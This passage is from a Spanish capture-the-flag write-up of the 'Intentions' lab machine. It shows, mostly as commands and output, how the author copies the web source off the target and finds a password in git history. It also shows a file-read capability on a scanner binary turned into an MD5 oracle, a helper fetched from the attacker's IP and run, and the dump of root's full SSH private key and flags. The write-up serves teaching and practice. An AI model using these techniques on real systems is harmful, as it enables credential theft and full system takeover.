+drwxr-xr-x   4 root     root       4096 Apr 12  2022 tests
+drwxr-xr-x  45 root     root       4096 Jan 29 19:58 vendor
+-rw-r--r--   1 root     root        722 Feb  2 17:46 webpack.mix.js
+</code></pre></div><p>Como de costumbre, debemos buscar credenciales en texto claro para conexiones de bases de datos, archivos de configuración, variables de entorno&mldr; tal vez se pueden descubrir otras vulnerabilidades leyendo el código fuente.</p><p>Además, hay un directorio <code>.git</code>. Entonces, el código fuente de PHP se gestiona con un repositorio de Git. Desde esta <em>shell</em>, tendremos algunos problemas para enumerar el repositorio de Git:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@intentions:~$ cd html/intentions/
+www-data@intentions:~/html/intentions$ git log
+fatal: detected dubious ownership in repository at '/var/www/html/intentions'  
+To add an exception for this directory, call:
+
+        git config --global --add safe.directory /var/www/html/intentions
+www-data@intentions:~/html/intentions$ git status
+fatal: detected dubious ownership in repository at '/var/www/html/intentions'
+To add an exception for this directory, call:
+
+        git config --global --add safe.directory /var/www/html/intentions
+</code></pre></div><p>Por lo tanto, una buena idea es comprimir el directorio del servidor web y transferirlo a nuestra máquina:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@intentions:~/html/intentions$ cd ..
+www-data@intentions:~/html$ tar cfz /tmp/intentions.tar.gz intentions/
+www-data@intentions:~/html$ cd /tmp
+www-data@intentions:/tmp$ file intentions.tar.gz
+intentions.tar.gz: gzip compressed data, from Unix, original size modulo 2^32 374579200  
+www-data@intentions:/tmp$ ls -lh --time-style=+ intentions.tar.gz
+-rw-r--r-- 1 www-data www-data 192M  intentions.tar.gz
+www-data@intentions:/tmp$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.17.44 - - [] "GET /intentions.tar.gz HTTP/1.1" 200 -
+^C
+Keyboard interrupt received, exiting.
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">wget</span> -q 10.10.11.220:8000/intentions.tar.gz  
+
+<span class="code-cyan">$</span> <span class="code-dark-green">tar</span> xfz <span class="mtku">intentions.tar.gz</span>
+
+<span class="code-cyan">$</span> <span class="code-dark-green">cd</span> <span class="mtku">intentions</span>
+</code></pre></div><h2 id="movimiento-lateral-al-usuario-greg">Movimiento lateral al usuario <code>greg</code></h2><p>En este punto, podemos usar <code>git</code> para enumerar el repositorio. Por ejemplo, comencemos a enumerar ramas y <em>commits</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">git</span> branch
+* <span class="code-dark-green">master</span>
+
+<span class="code-cyan">$</span> <span class="code-dark-green">git</span> log
+<span class="code-dark-yellow">commit 1f29dfde45c21be67bb2452b46d091888ed049c3 (<span class="code-cyan">HEAD -&gt;</span> <span class="code-green">master</span>)</span>
+Author: steve &lt;steve@intentions.htb&gt;
+Date:   Mon Jan 30 15:29:12 2023 +0100
+
+    Fix webpack for production
+
+<span class="code-dark-yellow">commit f7c903a54cacc4b8f27e00dbf5b0eae4c16c3bb4</span>
+Author: greg &lt;greg@intentions.htb&gt;
+Date:   Thu Jan 26 09:21:52 2023 +0100
+
+    Test cases did not work on steve's local database, switching to user factory per his advice  
+
+<span class="code-dark-yellow">commit 36b4287cf2fb356d868e71dc1ac90fc8fa99d319</span>
+Author: greg &lt;greg@intentions.htb&gt;
+Date:   Wed Jan 25 20:45:12 2023 +0100
+
+    Adding test cases for the API!
+
+<span class="code-dark-yellow">commit d7ef022d3bc4e6d02b127fd7dcc29c78047f31bd</span>
+Author: steve &lt;steve@intentions.htb&gt;
+Date:   Fri Jan 20 14:19:32 2023 +0100
+
+    Initial v2 commit
+</code></pre></div><p>Al leer uno de los <em>commits</em>, podemos encontrar una contraseña en texto claro para el usuario <code>greg</code> (<code>Gr3g1sTh3B3stDev3l0per!1998!</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-white">diff --git a/tests/Feature/Helper.php b/tests/Feature/Helper.php</span>
+<span class="code-white">new file mode 100644</span>
+<span class="code-white">index 0000000..f57e37b</span>
+<span class="code-white">--- /dev/null</span>
+<span class="code-white">+++ b/tests/Feature/Helper.php</span>
+<span class="code-dark-cyan">@@ -0,0 +1,19 @@</span>
+<span class="code-dark-green">+&lt;?php</span>
+<span class="code-dark-green">+</span>
+<span class="code-dark-green">+namespace Tests\Feature;</span>
+<span class="code-dark-green">+use Tests\TestCase;</span>
+<span class="code-dark-green">+use App\Models\User;</span>
+<span class="code-dark-green">+use Auth;</span>
+<span class="code-dark-green">+class Helper extends TestCase</span>
+<span class="code-dark-green">+{</span>
+<span class="code-dark-green">+    public static function getToken($test, $admin = false) {</span>
+<span class="code-dark-green">+        if($admin) {</span>
+<span class="code-dark-green">+            $res = $test-&gt;postJson('/api/v1/auth/login', ['email' =&gt; 'greg@intentions.htb', 'password' =&gt; 'Gr3g1sTh3B3stDev3l0per!1998!']);</span>
+<span class="code-dark-green">+            return $res-&gt;headers-&gt;get('Authorization');</span>
+<span class="code-dark-green">+        }</span>
+<span class="code-dark-green">+        else {</span>
+<span class="code-dark-green">+            $res = $test-&gt;postJson('/api/v1/auth/login', ['email' =&gt; 'greg_user@intentions.htb', 'password' =&gt; 'Gr3g1sTh3B3stDev3l0per!1998!']);</span>  
+<span class="code-dark-green">+            return $res-&gt;headers-&gt;get('Authorization');</span>
+<span class="code-dark-green">+        }</span>
+<span class="code-dark-green">+    }</span>
+<span class="code-dark-green">+}</span>
+<span class="code-bg-white code-black">(END)</span>
+</code></pre></div><p>Y esta contraseña funciona para conectarse a través de SSH:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ssh</span> greg@10.10.11.220
+greg@10.10.11.220's password:
+$ bash
+<span class="code-green">greg@intentions</span>:<span class="code-blue">~</span>$ cat user.txt
+645f9b8661b3482d3c1ffd2faa83ec66  
+</code></pre></div><h2 id="escalada-de-privilegios">Escalada de privilegios</h2><p>Recordemos que ahora pertenecemos al grupo <code>scanner</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">greg@intentions</span>:<span class="code-blue">~</span>$ id
+uid=1001(greg) gid=1001(greg) groups=1001(greg),1003(scanner)  
+</code></pre></div><p>Entonces, podemos acceder a archivos en <code>/opt/scanner</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">greg@intentions</span>:<span class="code-blue">~</span>$ find / -group scanner 2&gt;/dev/null
+/opt/scanner
+/opt/scanner/scanner
+<span class="code-green">greg@intentions</span>:<span class="code-blue">~</span>$ file /opt/scanner/scanner
+/opt/scanner/scanner: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=a7sTitVjvr1qc4Ngg3jt/LY6QPsAiDYUOHaK7gUXN/5aWVPmSwER6KHrDxGzr4/SUP48whD2UTLJ-Q2kLmf, stripped  
+<span class="code-green">greg@intentions</span>:<span class="code-blue">~</span>$ /opt/scanner/scanner
+The copyright_scanner application provides the capability to evaluate a single file or directory of files against a known blacklist and return matches.
+
+        This utility has been developed to help identify copyrighted material that have previously been submitted on the platform.
+        This tool can also be used to check for duplicate images to avoid having multiple of the same photos in the gallery.
+        File matching are evaluated by comparing an MD5 hash of the file contents or a portion of the file contents against those submitted in the hash file.
+
+        The hash blacklist file should be maintained as a single LABEL:MD5 per line.
+        Please avoid using extra colons in the label as that is not currently supported.
+
+        Expected output:
+        1. Empty if no matches found
+        2. A line for every match, example:
+                [+] {LABEL} matches {FILE}
+
+  -c string
+        Path to image file to check. Cannot be combined with -d
+  -d string
+        Path to image directory to check. Cannot be combined with -c
+  -h string
+        Path to colon separated hash file. Not compatible with -p
+  -l int
+        Maximum bytes of files being checked to hash. Files smaller than this value will be fully hashed. Smaller values are much faster but prone to false positives. (default 500)
+  -p    [Debug] Print calculated file hash. Only compatible with -c
+  -s string
+        Specific hash to check against. Not compatible with -h
+</code></pre></div><p>Además, hay algunos archivos interesantes en el directorio personal que se refieren a <code>/opt/scanner/scanner</code> también:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">greg@intentions</span>:<span class="code-blue">~</span>$ ll
+total 60
+drwxr-x--- 5 greg greg  4096 Jul  6 00:51 <span class="code-blue">.</span>/
+drwxr-xr-x 5 root root  4096 Jun 10 14:56 <span class="code-blue">..</span>/
+lrwxrwxrwx 1 root root     9 Jun 19 13:09 <span class="code-cyan">.bash_history</span> -&gt; <span class="code-yellow">/dev/null</span>
+-rw-r--r-- 1 greg greg   220 Feb  2 18:10 .bash_logout
+-rw-r--r-- 1 greg greg  3771 Feb  2 18:10 .bashrc
+drwx------ 2 greg greg  4096 Jun 10 15:18 <span class="code-blue">.cache</span>/
+-rwxr-x--- 1 root greg    75 Jun 10 17:33 <span class="code-green">dmca_check.sh</span>*
+-rwxr----- 1 root greg 11044 Jun 10 15:31 <span class="code-green">dmca_hashes.test</span>*
+drwx------ 3 greg greg  4096 Jul  5 20:07 <span class="code-blue">.gnupg</span>/
+drwxrwxr-x 3 greg greg  4096 Jun 10 15:26 <span class="code-blue">.local</span>/
+-rw-r--r-- 1 greg greg   807 Feb  2 18:10 .profile
+-rw------- 1 greg greg    12 Jul  5 12:53 .python_history
+-rw-r----- 1 root greg    33 Jul  5 07:29 user.txt
+-rw-r--r-- 1 greg greg    39 Jun 14 10:18 .vimrc
+<span class="code-green">greg@intentions</span>:<span class="code-blue">~</span>$ cat dmca_check.sh
+/opt/scanner/scanner -d /home/legal/uploads -h /home/greg/dmca_hashes.test  
+<span class="code-green">greg@intentions</span>:<span class="code-blue">~</span>$ head dmca_hashes.test
+DMCA-#5133:218a61dfdebf15292a94c8efdd95ee3c
+DMCA-#4034:a5eff6a2f4a3368707af82d3d8f665dc
+DMCA-#7873:7b2ad34b92b4e1cb73365fe76302e6bd
+DMCA-#2901:052c4bb8400a5dc6d40bea32dfcb70ed
+DMCA-#9112:0def227f2cdf0bb3c44809470f28efb6
+DMCA-#9564:b58b5d64a979327c6068d447365d2593
+DMCA-#8997:26c3660f8051c384b63ba40ea38bfc72
+DMCA-#2247:4a705343f961103c567f98b808ee106d
+DMCA-#6455:1db4f2c6e897d7e2684ffcdf7d907bb3
+DMCA-#9245:ae0e837a5492c521965fe1a32792e3f3
+</code></pre></div><h3 id="lectura-de-archivos-como-root">Lectura de archivos como <code>root</code></h3><p>El binario <code>/opt/scanner/scanner</code> parece prometedor, pero no es SUID, y no podemos ejecutarlo con <code>sudo</code>. Sin embargo, podemos enumerar las <em>capabilities</em> y descubrir que el binario tiene <code>CAP_DAC_READ_SEARCH</code> activada, que nos permite leer cualquier archivo como <code>root</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">greg@intentions</span>:<span class="code-blue">~</span>$ getcap -r / 2&gt;/dev/null
+/usr/bin/mtr-packet cap_net_raw=ep
+/usr/bin/ping cap_net_raw=ep
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep  
+/opt/scanner/scanner cap_dac_read_search=ep
+</code></pre></div><p>La herramienta toma un archivo y calcula un <em>hash</em> MD5 que luego se compara con una lista de <em>hashes</em> para encontrar coincidencias. Podemos establecer el número de bytes para leer del archivo con <code>-l</code>.</p><p>Hay muchas opciones, pero solo usé <code>-l</code>, <code>-c</code> y <code>-h</code> para el proceso de explotación. <code>-c</code> es para indicar el archivo sobre el que calcular el <em>hash</em> MD5, y <code>-h</code> se usa para especificar un archivo que contiene una descripción y un <em>hash</em> separado por dos puntos (<code>:</code>), que se utiliza para verificar las coincidencias.</p><p>La forma en la que resolví este pequeño reto es un poco exagerada, ya que el programa tiene más opciones que pueden hacerlo más fácil. De todos modos, esta es la idea: podemos tener una longitud dada de un archivo y verificarlo con <em>hashes</em> precomputados. Podemos precomputar el <em>hash</em> de todos los caracteres imprimibles, luego pedirle al binario que calcule el <em>hash</em> del primer byte de un archivo y luego verifique ese <em>hash</em> con nuestra lista de <em>hashes</em> precomputados para encontrar el carácter. Después, agregamos otro carácter variable a la lista de <em>hashes</em> precomputados y continuamos el proceso hasta que se encuentren todos los caracteres del archivo.</p><p>Aquí tenemos una prueba de concepto (con solo <code>-l</code>, <code>-c</code> y <code>-h</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">greg@intentions</span>:<span class="code-blue">~</span>$ head -1 /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+<span class="code-green">greg@intentions</span>:<span class="code-blue">~</span>$ cd /tmp
+<span class="code-green">greg@intentions</span>:<span class="code-blue">/tmp</span>$ echo -n r | md5sum
+4b43b0aee35624cd95b910189b3dc231  -
+<span class="code-green">greg@intentions</span>:<span class="code-blue">/tmp</span>$ echo r:4b43b0aee35624cd95b910189b3dc231 &gt; hashes
+<span class="code-green">greg@intentions</span>:<span class="code-blue">/tmp</span>$ /opt/scanner/scanner -l 1 -c /etc/passwd -h /tmp/hashes  
+[+] r matches /etc/passwd
+<span class="code-green">greg@intentions</span>:<span class="code-blue">/tmp</span>$ echo -n ro | md5sum
+3605c251087b88216c9bca890e07ad9c  -
+<span class="code-green">greg@intentions</span>:<span class="code-blue">/tmp</span>$ echo o:3605c251087b88216c9bca890e07ad9c &gt; hashes
+<span class="code-green">greg@intentions</span>:<span class="code-blue">/tmp</span>$ /opt/scanner/scanner -l 2 -c /etc/passwd -h /tmp/hashes
+[+] o matches /etc/passwd
+<span class="code-green">greg@intentions</span>:<span class="code-blue">/tmp</span>$ echo -n roo | md5sum
+6606afc4c696fa1b4f0f68408726649d  -
+<span class="code-green">greg@intentions</span>:<span class="code-blue">/tmp</span>$ echo o:6606afc4c696fa1b4f0f68408726649d &gt; hashes
+<span class="code-green">greg@intentions</span>:<span class="code-blue">/tmp</span>$ /opt/scanner/scanner -l 3 -c /etc/passwd -h /tmp/hashes
+[+] o matches /etc/passwd
+<span class="code-green">greg@intentions</span>:<span class="code-blue">/tmp</span>$ echo -n root | md5sum
+63a9f0ea7bb98050796b649e85481845  -
+<span class="code-green">greg@intentions</span>:<span class="code-blue">/tmp</span>$ echo t:63a9f0ea7bb98050796b649e85481845 &gt; hashes
+<span class="code-green">greg@intentions</span>:<span class="code-blue">/tmp</span>$ /opt/scanner/scanner -l 4 -c /etc/passwd -h /tmp/hashes
+[+] t matches /etc/passwd
+</code></pre></div><p>Espero que esté claro que estamos encontrando el siguiente carácter del archivo. Con este proceso, podemos leer <code>/root/root.txt</code>, <code>/etc/shadow</code> y <code>/root/.ssh/id_rsa</code>, que son útiles para la escalada de privilegios. El proceso anterior debe ser automatizado; para eso, decidí escribir un programa en C llamado <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Intentions/get_file.c"><code>get_file.c</code></a> (explicación detallada <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Intentions#get_filec">aquí</a>).</p><p>Una vez compilado, podemos transferirlo a la máquina y obtener la clave privada de SSH <code>id_rsa</code> del usuario <code>root</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gcc</span> <span class="mtku">get_file.c</span> -lcrypto -s -static -O3 -o get_file
+
+<span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -m http.server 80
+Serving HTTP on :: port 80 (http://[::]:80/) ...
+::ffff:10.10.11.220 - - [] "GET /get_file HTTP/1.1" 200 -  
+^C
+Keyboard interrupt received, exiting.
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">greg@intentions</span>:<span class="code-blue">/tmp</span>$ wget -q 10.10.17.44/get_file
+<span class="code-green">greg@intentions</span>:<span class="code-blue">/tmp</span>$ chmod +x get_file
+<span class="code-green">greg@intentions</span>:<span class="code-blue">/tmp</span>$ ./get_file
+[!] Usage: ./get_file &lt;file-to-read&gt;
+<span class="code-green">greg@intentions</span>:<span class="code-blue">/tmp</span>$ cd /opt/scanner
+<span class="code-green">greg@intentions</span>:<span class="code-blue">/opt/scanner</span>$ /tmp/get_file /root/.ssh/id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+</code></pre></div><p>También podríamos haber leído <code>root.txt</code>, pero es mejor tener acceso completo como <code>root</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">vim</span> id_rsa
+
+<span class="code-cyan">$</span> <span class="code-dark-green">chmod</span> 600 <span class="mtku">id_rsa</span>
+
+<span class="code-cyan">$</span> <span class="code-dark-green">ssh</span> -i <span class="mtku">id_rsa</span> root@10.10.11.220  
+root@intentions:~# cat root.txt
+426acc1079e35bc4263e98f6ba65ed1c
+</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#escaneo-de-puertos">Escaneo de puertos</a></li><li><a href="#enumeración">Enumeración</a><ul><li><a href="#enumeración-de-la-api">Enumeración de la API</a></li></ul></li><li><a href="#acceso-a-la-máquina">Acceso a la máquina</a><ul><li><a href="#inyección-de-código-sql">Inyección de código SQL</a></li><li><a href="#_pass-the-hash_"><em>Pass the Hash</em></a></li><li><a href="#ejecución-remota-de-comandos">Ejecución remota de comandos</a></li></ul></li><li><a href="#enumeración-del-sistema">Enumeración del sistema</a></li><li><a href="#movimiento-lateral-al-usuario-greg">Movimiento lateral al usuario <code>greg</code></a></li><li><a href="#escalada-de-privilegios">Escalada de privilegios</a><ul><li><a href="#lectura-de-archivos-como-root">Lectura de archivos como <code>root</code></a></li></ul></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://tinyletter.com/7Rocky" method="post" target="popupwindow" onsubmit='return window.open("https://tinyletter.com/7Rocky","popupwindow","scrollbars=yes,width=800,height=600"),!0'><h3 class="tc">Recibe un resumen semanal del blog</h3><p class="tc"><label for="tlemail"></label></p><p class="tc"><input type="text" class="w-80 f5 pv3 ph3 bg-light-gray bn search" placeholder="Introduce tu correo electrónico" name="email" id="tlemail">
+<input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Submit"></p><input type="hidden" value="1" name="embed">
+<input style="display:none;color:var(--header)" type="submit" value="Suscribirse"><p class="tc">impulsado por <a href="https://tinyletter.com" target="_blank" title="TinyLetter">TinyLetter</a></p><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; Blog de 7Rocky. Ciberseguridad y Mates 2023</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>
